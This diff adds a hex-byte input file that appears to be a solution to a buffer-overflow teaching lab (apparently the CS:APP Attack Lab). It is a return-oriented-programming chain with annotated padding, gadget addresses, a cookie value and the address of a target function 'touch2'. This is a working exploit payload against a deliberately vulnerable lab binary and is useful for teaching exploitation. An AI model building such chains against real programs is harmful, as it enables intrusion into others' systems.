@@ -1,0 +1,9 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* 40 bytes garbage */
+cc 19 40 00 00 00 00 00 /* address of gadget1, 0x4019cc, popq %rax */
+fa 97 b9 59 00 00 00 00 /* cookie, 0x59b997fa */
+a3 19 40 00 00 00 00 00 /* address of gadget2, 0x4019a3, mov %rax, %rdi */
+ec 17 40 00 00 00 00 00 /* address of touch2, 0x4017ec */
